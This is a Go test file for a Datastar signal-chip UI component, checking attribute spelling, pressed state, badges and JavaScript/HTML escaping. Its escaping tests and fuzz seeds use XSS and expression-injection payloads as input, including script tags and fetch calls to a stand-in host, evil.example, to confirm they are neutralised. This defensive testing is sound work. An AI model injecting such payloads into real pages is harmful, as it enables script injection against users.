package datastar

import (
	"html"
	"strconv"
	"strings"
	"testing"

	"github.com/a-h/templ"
	"github.com/larsartmann/templ-components/utils"
)

// signalChipAttrValue returns the raw, still HTML-escaped value of the first
// attribute named name in output ("" when absent). templ entity-escapes
// quotes inside attribute values, so the closing quote is the first quote
// after the opening one.
func signalChipAttrValue(output, name string) string {
	const prefix = `="`

	start := strings.Index(output, " "+name+prefix)
	if start < 0 {
		return ""
	}

	rest := output[start+1+len(name)+len(prefix):]
	end := strings.Index(rest, `"`)

	if end < 0 {
		return ""
	}

	return rest[:end]
}

// signalChipAttrExpr returns the attribute value the way the runtime reads
// it: after the HTML parser decoded templ's entity escaping.
func signalChipAttrExpr(output, name string) string {
	return html.UnescapeString(signalChipAttrValue(output, name))
}

func TestSignalChipExpressions(t *testing.T) {
	t.Parallel()

	tests := []struct {
		name        string
		signal      string
		value       string
		wantClick   string
		wantClass   string
		wantPressed string
		wantSignals string
	}{
		{
			name:        "camelCase signal",
			signal:      "stateFilter",
			value:       "open",
			wantClick:   "$stateFilter='open'",
			wantClass:   "{ '" + signalChipSelectedClass + "': $stateFilter==='open', '" + signalChipUnselectedClass + "': $stateFilter!=='open' }",
			wantPressed: "$stateFilter==='open' ? 'true' : 'false'",
			wantSignals: "{'stateFilter':'open'}",
		},
		{
			name:        "nested signal with an empty all value",
			signal:      "filters.state",
			value:       "",
			wantClick:   "$filters.state=''",
			wantClass:   "{ '" + signalChipSelectedClass + "': $filters.state==='', '" + signalChipUnselectedClass + "': $filters.state!=='' }",
			wantPressed: "$filters.state==='' ? 'true' : 'false'",
			wantSignals: "{'filters':{'state':''}}",
		},
	}

	for _, tc := range tests {
		t.Run(tc.name, func(t *testing.T) {
			t.Parallel()

			if got := signalChipClickExpr(tc.signal, tc.value); got != tc.wantClick {
				t.Errorf("signalChipClickExpr = %q, want %q", got, tc.wantClick)
			}

			if got := signalChipClassExpr(tc.signal, tc.value); got != tc.wantClass {
				t.Errorf("signalChipClassExpr = %q, want %q", got, tc.wantClass)
			}

			if got := signalChipPressedExpr(tc.signal, tc.value); got != tc.wantPressed {
				t.Errorf("signalChipPressedExpr = %q, want %q", got, tc.wantPressed)
			}

			if got := signalChipSignalsExpr(tc.signal, tc.value); got != tc.wantSignals {
				t.Errorf("signalChipSignalsExpr = %q, want %q", got, tc.wantSignals)
			}
		})
	}
}

// TestSignalChipRuntimeContract pins the attribute spellings and expression
// shapes the pinned Datastar runtime actually parses. Each line below is a
// contract that shipped broken in a consumer once (docs/datastar-runtime-facts.md).
func TestSignalChipRuntimeContract(t *testing.T) {
	t.Parallel()

	output := utils.Render(t, SignalChip(SignalChipProps{
		Signal:   "stateFilter",
		Value:    "open",
		Label:    "Open",
		Selected: true,
	}))

	// The event attribute uses the COLON spelling. The dash spelling names
	// an unknown plugin that the runtime drops without a log line.
	utils.AssertContains(t, output, `data-on:click="`)

	utils.AssertNotContains(t, output, "data-on-click")

	// The click expression assigns the configured value to the configured signal.
	if got, want := signalChipAttrExpr(output, "data-on:click"), "$stateFilter='open'"; got != want {
		t.Errorf("data-on:click = %q, want %q", got, want)
	}

	// data-class is an OBJECT of class names to booleans. A plain class
	// string is iterated character by character by the runtime.
	classExpr := signalChipAttrExpr(output, "data-class")

	if !strings.HasPrefix(classExpr, "{") || !strings.HasSuffix(classExpr, "}") {
		t.Errorf("data-class is not an object expression: %q", classExpr)
	}

	wantClass := "{ '" + signalChipSelectedClass + "': $stateFilter==='open', '" +
		signalChipUnselectedClass + "': $stateFilter!=='open' }"

	if classExpr != wantClass {
		t.Errorf("data-class = %q, want %q", classExpr, wantClass)
	}

	// aria-pressed is driven by a STRING expression so the attribute stays
	// present and valid in both states (a boolean would toggle it off).
	if got, want := signalChipAttrExpr(output, "data-attr:aria-pressed"),
		"$stateFilter==='open' ? 'true' : 'false'"; got != want {
		t.Errorf("data-attr:aria-pressed = %q, want %q", got, want)
	}

	// The attribute spelling agrees with the typed On builder, so the two
	// can never drift apart.
	if _, ok := On("click", "$a=1").Attrs()["data-on:click"]; !ok {
		t.Error(`On("click", …).Attrs() no longer emits the data-on:click key the chip relies on`)
	}
}

func TestSignalChipPressedState(t *testing.T) {
	t.Parallel()

	output := utils.Render(t, SignalChipGroup(SignalChipGroupProps{
		Signal:   "stateFilter",
		Selected: "open",
		Items: []SignalChipItem{
			{Label: "All"},
			{Label: "Open", Value: "open"},
			{Label: "Done", Value: "done"},
		},
	}))

	if got := strings.Count(output, `aria-pressed="true"`); got != 1 {
		t.Errorf("aria-pressed=true rendered %d times, want exactly 1 (the selected chip)", got)
	}

	if got := strings.Count(output, `aria-pressed="false"`); got != 2 {
		t.Errorf("aria-pressed=false rendered %d times, want 2 (the other chips)", got)
	}

	// Only the pressed chip wears the pressed look in its static class; the
	// others carry the unpressed one. (Every chip's data-class object names
	// both looks, so the class list is read per chip element.)
	for i, chip := range strings.Split(output, "<button")[1:] {
		class := signalChipAttrValue(chip, "class")

		wantPressed := i == 1

		if got := strings.Contains(class, "bg-accent-600"); got != wantPressed {
			t.Errorf("chip %d pressed look = %v, want %v (class %q)", i, got, wantPressed, class)
		}

		if got := strings.Contains(class, "bg-white"); got == wantPressed {
			t.Errorf("chip %d unpressed look = %v, want %v (class %q)", i, got, !wantPressed, class)
		}
	}

	// Exactly one chip declares the signal's initial value.
	if got := strings.Count(output, `data-signals=`); got != 1 {
		t.Errorf("data-signals rendered %d times, want 1", got)
	}
}

func TestSignalChipCount(t *testing.T) {
	t.Parallel()

	t.Run("nil count renders no badge", func(t *testing.T) {
		t.Parallel()

		output := utils.Render(t, SignalChip(SignalChipProps{Signal: "s", Value: "v", Label: "Open"}))

		utils.AssertContains(t, output, ">Open</button>")

		utils.AssertNotContains(t, output, "<span")
	})

	t.Run("count renders a tabular badge", func(t *testing.T) {
		t.Parallel()

		count := 42
		output := utils.Render(t, SignalChip(SignalChipProps{
			Signal: "s", Value: "v", Label: "Open", Count: &count,
		}))

		utils.AssertContainsAll(t, output, `>Open <span`, `>42</span></button>`)

		utils.AssertNotContains(t, output, `>Open</button>`)
	})

	t.Run("a zero count still renders", func(t *testing.T) {
		t.Parallel()

		count := 0
		output := utils.Render(t, SignalChip(SignalChipProps{
			Signal: "s", Value: "v", Label: "Open", Count: &count,
		}))

		utils.AssertContains(t, output, `>0</span>`)
	})
}

func TestSignalChipInertWithoutBindableSignal(t *testing.T) {
	t.Parallel()

	tests := []struct {
		name   string
		signal string
	}{
		{"empty", ""},
		{"whitespace", "   "},
		{"dollar prefix is not part of the name", "$stateFilter"},
		{"dash", "state-filter"},
		{"space", "state filter"},
		{"empty segment", "filters..state"},
		{"leading dot", ".state"},
		{"trailing dot", "state."},
		{"leading digit", "1state"},
		{"expression injection", "state'; alert(1); '"},
		{"newline", "state\nfilter"},
	}

	for _, tc := range tests {
		t.Run(tc.name, func(t *testing.T) {
			t.Parallel()

			if signalChipIsLive(tc.signal) {
				t.Fatalf("signalChipIsLive(%q) = true, want false", tc.signal)
			}

			output := utils.Render(t, SignalChip(SignalChipProps{
				Signal: tc.signal, Value: "open", Label: "Open", Selected: true,
			}))

			// No data-* binding at all: nothing for the runtime to misparse.
			utils.AssertNotContains(t, output, "data-on")
			utils.AssertNotContains(t, output, "data-class")
			utils.AssertNotContains(t, output, "data-attr")
			utils.AssertNotContains(t, output, "data-signals")

			// The server-rendered state still reads correctly.
			utils.AssertContains(t, output, `aria-pressed="true"`)
			utils.AssertContains(t, output, "bg-accent-600")
		})
	}
}

// TestSignalChipEscaping pins that no quote, bracket, or tag sequence in a
// value or label can terminate the attribute or the JavaScript string literal
// it contains, and that no signal NAME can smuggle code into an expression.
func TestSignalChipEscaping(t *testing.T) {
	t.Parallel()

	t.Run("hostile value stays one string literal", func(t *testing.T) {
		t.Parallel()

		value := `it's "quoted" </button><script>alert(1)</script>\`

		output := utils.Render(t, SignalChip(SignalChipProps{
			Signal: "stateFilter", Value: value, Label: "Open", Selected: true,
		}))

		if got, want := signalChipAttrExpr(output, "data-on:click"),
			`$stateFilter='it\'s "quoted" </button><script>alert(1)</script>\\'`; got != want {
			t.Errorf("data-on:click = %q, want %q", got, want)
		}

		// The HTML attribute itself is intact: templ entity-escaped the value.
		utils.AssertContains(t, output, `data-on:click="$stateFilter=&#39;it\&#39;s &#34;quoted&#34; &lt;/button&gt;&lt;script&gt;`)

		utils.AssertNotContains(t, output, "<script")

		utils.AssertNotContains(t, output, "</button><")

		if got := strings.Count(output, "<button"); got != 1 {
			t.Errorf("<button rendered %d times, want 1", got)
		}

		if got := strings.Count(output, "</button>"); got != 1 {
			t.Errorf("</button> rendered %d times, want 1", got)
		}

		// The following attribute still opens where it must.
		utils.AssertContains(t, output, ` data-class="{ `)

		// The signal declaration carries the same value, escaped alike.
		if got, want := signalChipAttrExpr(output, "data-signals"),
			`{'stateFilter':'it\'s "quoted" </button><script>alert(1)</script>\\'}`; got != want {
			t.Errorf("data-signals = %q, want %q", got, want)
		}
	})

	t.Run("hostile label is escaped as text", func(t *testing.T) {
		t.Parallel()

		output := utils.Render(t, SignalChip(SignalChipProps{
			Signal: "stateFilter", Value: "open", Label: `"><script>alert('x')</script>`,
		}))

		utils.AssertContains(t, output, `>&#34;&gt;&lt;script&gt;alert(&#39;x&#39;)&lt;/script&gt;</button>`)

		utils.AssertNotContains(t, output, "<script")
	})

	t.Run("hostile signal name never reaches an expression", func(t *testing.T) {
		t.Parallel()

		output := utils.Render(t, SignalChip(SignalChipProps{
			Signal: `x'); fetch('//evil.example'); ('`, Value: "open", Label: "Open", Selected: true,
		}))

		utils.AssertNotContains(t, output, "fetch(")

		utils.AssertNotContains(t, output, "evil.example")

		utils.AssertNotContains(t, output, "data-on")
	})

	t.Run("class names in the object are string literals", func(t *testing.T) {
		t.Parallel()

		classExpr := signalChipAttrExpr(
			utils.Render(t, SignalChip(SignalChipProps{Signal: "s", Value: "v", Label: "L"})),
			"data-class",
		)

		if !strings.HasPrefix(classExpr, "{ '"+signalChipSelectedClass+"': ") {
			t.Errorf("data-class keys are not the quoted class sets: %q", classExpr)
		}
	})
}

func TestSignalChipSelectedDeclaresInitialSignal(t *testing.T) {
	t.Parallel()

	t.Run("selected chip declares the signal", func(t *testing.T) {
		t.Parallel()

		output := utils.Render(t, SignalChip(SignalChipProps{
			Signal: "stateFilter", Value: "open", Label: "Open", Selected: true,
		}))

		utils.AssertContains(t, output, `data-signals="{&#39;stateFilter&#39;:&#39;open&#39;}"`)
	})

	t.Run("unselected chip leaves the signal alone", func(t *testing.T) {
		t.Parallel()

		output := utils.Render(t, SignalChip(SignalChipProps{
			Signal: "stateFilter", Value: "open", Label: "Open",
		}))

		utils.AssertNotContains(t, output, "data-signals")

		utils.AssertContains(t, output, `aria-pressed="false"`)
	})

	t.Run("a selected chip with no signal stays undeclared", func(t *testing.T) {
		t.Parallel()

		// Declaring a signal needs a bindable name; an inert chip must not
		// emit data-signals either.
		output := utils.Render(t, SignalChip(SignalChipProps{Value: "open", Label: "Open", Selected: true}))

		utils.AssertNotContains(t, output, "data-signals")
	})
}

func TestSignalChipBaseProps(t *testing.T) {
	t.Parallel()

	t.Run("ID, Class, Attrs and AriaLabel reach the root", func(t *testing.T) {
		t.Parallel()

		output := utils.Render(t, SignalChip(SignalChipProps{
			BaseProps: utils.BaseProps{
				ID:        "chip-open",
				Class:     "rounded-md",
				Attrs:     templ.Attributes{"data-tc": "x"},
				AriaLabel: "Show open findings",
			},
			Signal: "stateFilter",
			Value:  "open",
			Label:  "Open",
		}))

		utils.AssertContainsAll(t, output, `id="chip-open"`, `data-tc="x"`, `aria-label="Show open findings"`)

		// Class wins the shape conflict (tailwind-merge).
		utils.AssertContains(t, output, "rounded-md")

		utils.AssertNotContains(t, output, "rounded-full")
	})

	t.Run("the pressed look survives a Class override", func(t *testing.T) {
		t.Parallel()

		output := utils.Render(t, SignalChip(SignalChipProps{
			BaseProps: utils.BaseProps{Class: "rounded-md"},
			Signal:    "stateFilter",
			Value:     "open",
			Label:     "Open",
			Selected:  true,
		}))

		utils.AssertContains(t, output, "bg-accent-600")
	})
}

func TestSignalChipGroupProps(t *testing.T) {
	t.Parallel()

	t.Run("AriaLabel names the group", func(t *testing.T) {
		t.Parallel()

		output := utils.Render(t, SignalChipGroup(SignalChipGroupProps{
			AriaLabel: "Filter by state",
			Signal:    "stateFilter",
		}))

		utils.AssertContains(t, output, `role="group"`)
		utils.AssertContains(t, output, `aria-label="Filter by state"`)
	})

	t.Run("unnamed group falls back to a generic filter label", func(t *testing.T) {
		t.Parallel()

		output := utils.Render(t, SignalChipGroup(SignalChipGroupProps{Signal: "stateFilter"}))

		utils.AssertContains(t, output, `role="group" aria-label="Filters"`)
	})

	t.Run("ID, Class and Attrs reach the wrapper", func(t *testing.T) {
		t.Parallel()

		output := utils.Render(t, SignalChipGroup(SignalChipGroupProps{
			BaseProps: utils.BaseProps{
				ID:    "state-chips",
				Class: "gap-3",
				Attrs: templ.Attributes{"data-tc": "y"},
			},
			Signal: "stateFilter",
		}))

		utils.AssertContainsAll(t, output, `id="state-chips"`, `data-tc="y"`, `gap-3`)

		utils.AssertNotContains(t, output, "gap-2")
	})

	t.Run("every chip writes the group's signal", func(t *testing.T) {
		t.Parallel()

		output := utils.Render(t, SignalChipGroup(SignalChipGroupProps{
			Signal: "stateFilter",
			Items:  []SignalChipItem{{Label: "All"}, {Label: "Open", Value: "open"}},
		}))

		utils.AssertContainsAll(t, output, `data-on:click="$stateFilter=&#39;&#39;"`, `data-on:click="$stateFilter=&#39;open&#39;"`)
	})

	t.Run("items render in order", func(t *testing.T) {
		t.Parallel()

		output := utils.Render(t, SignalChipGroup(SignalChipGroupProps{
			Signal: "stateFilter",
			Items:  []SignalChipItem{{Label: "A", Value: "a"}, {Label: "B", Value: "b"}, {Label: "C", Value: "c"}},
		}))

		utils.AssertContains(t, output, `>A</button><button`)

		utils.AssertContains(t, output, `>B</button><button`)

		utils.AssertContains(t, output, `>C</button></div>`)
	})

	t.Run("zero-value group renders an empty named row", func(t *testing.T) {
		t.Parallel()

		output := utils.Render(t, SignalChipGroup(SignalChipGroupProps{}))

		if want := `<div class="flex flex-wrap gap-2 items-center" role="group" aria-label="Filters"></div>`; output != want {
			t.Errorf("zero-value group = %q, want %q", output, want)
		}
	})
}

func TestSignalChipDefaults(t *testing.T) {
	t.Parallel()

	chip := DefaultSignalChipProps()

	if chip.Signal != "" || chip.Value != "" || chip.Label != "" || chip.Count != nil || chip.Selected {
		t.Errorf("SignalChip defaults must be zero-valued; got %+v", chip)
	}

	group := DefaultSignalChipGroupProps()

	if group.Signal != "" || len(group.Items) != 0 || group.Selected != "" {
		t.Errorf("SignalChipGroup defaults must be zero-valued; got %+v", group)
	}
}

func TestJSStringLiteral(t *testing.T) {
	t.Parallel()

	tests := []struct {
		name  string
		input string
		want  string
	}{
		{"empty", "", `''`},
		{"plain", "open", `'open'`},
		{"apostrophe", "it's", `'it\'s'`},
		{"double quote passes through", `a"b`, `'a"b'`},
		{"trailing backslash", `a\`, `'a\\'`},
		{"backslash before quote cannot team up", `a\'; alert(1); '`, `'a\\\'; alert(1); \''`},
		{"newline", "a\nb", `'a\nb'`},
		{"carriage return", "a\rb", `'a\rb'`},
		{"control byte", "a\x00b", `'a\x00b'`},
		{"delete byte", "a\x7fb", `'a\x7fb'`},
		{"line separator", "a\u2028b", `'a\u2028b'`},
		{"paragraph separator", "a\u2029b", `'a\u2029b'`},
		{"unicode passes through", "caf\u00e9 \U0001F600", "'caf\u00e9 \U0001F600'"},
		{"invalid utf-8 byte", string([]byte{'a', 0xff, 'b'}), `'a\xffb'`},
	}

	for _, tc := range tests {
		t.Run(tc.name, func(t *testing.T) {
			t.Parallel()

			if got := jsStringLiteral(tc.input); got != tc.want {
				t.Errorf("jsStringLiteral(%q) = %q, want %q", tc.input, got, tc.want)
			}
		})
	}
}

// FuzzJSStringLiteral pins the escaping primitive every chip expression is
// built on: for ANY input the result is a single-quoted JavaScript string
// literal that no quote or backslash in the input can terminate early.
func FuzzJSStringLiteral(f *testing.F) {
	f.Add("")
	f.Add("open")
	f.Add("it's \"quoted\" </button><script>alert(1)</script>")
	f.Add("back\\slash \\")
	f.Add("a\\'; fetch('//evil.example'); '")
	f.Add("line\nbreak\r\nand\x00control\x7f")
	f.Add("\u2028\u2029 caf\u00e9 \U0001F600")
	f.Add(string([]byte{'a', 0xff, 0xfe, 'b'}))

	f.Fuzz(func(t *testing.T, s string) {
		lit := jsStringLiteral(s)

		if len(lit) < 2 || lit[0] != '\'' || lit[len(lit)-1] != '\'' {
			t.Fatalf("not a single-quoted literal: %q", lit)
		}

		inner := lit[1 : len(lit)-1]

		// JavaScript string scanning: an escape consumes the next character,
		// and no other quote may appear before the closing delimiter.
		for i := 0; i < len(inner); i++ {
			switch inner[i] {
			case '\\':
				i++
			case '\'':
				t.Fatalf("quote terminates the literal early: %q", lit)
			}

			if inner[i] < 0x20 || inner[i] == 0x7f {
				t.Fatalf("raw control byte %d in literal: %q", inner[i], lit)
			}
		}

		if strings.ContainsAny(inner, "\u2028\u2029") {
			t.Fatalf("raw line separator in literal: %q", lit)
		}

		// Round trip through Go's own unquoter. The literal only uses escapes
		// Go understands (\n, \r, \xNN, \uNNNN, \\) plus two spellings Go keeps
		// for other literal kinds: \', which Go allows in rune literals only, and
		// the raw double quotes a JavaScript single-quoted string may carry. Swap
		// the delimiters and re-spell both.
		goLiteral := strings.ReplaceAll(inner, `\'`, `'`)
		goLiteral = strings.ReplaceAll(goLiteral, `"`, `\"`)

		decoded, err := strconv.Unquote(`"` + goLiteral + `"`)
		if err != nil {
			t.Fatalf("literal does not decode: %v (%q)", err, lit)
		}

		if decoded != s {
			t.Fatalf("round trip lost data:\n got: %q\nwant: %q", decoded, s)
		}
	})
}
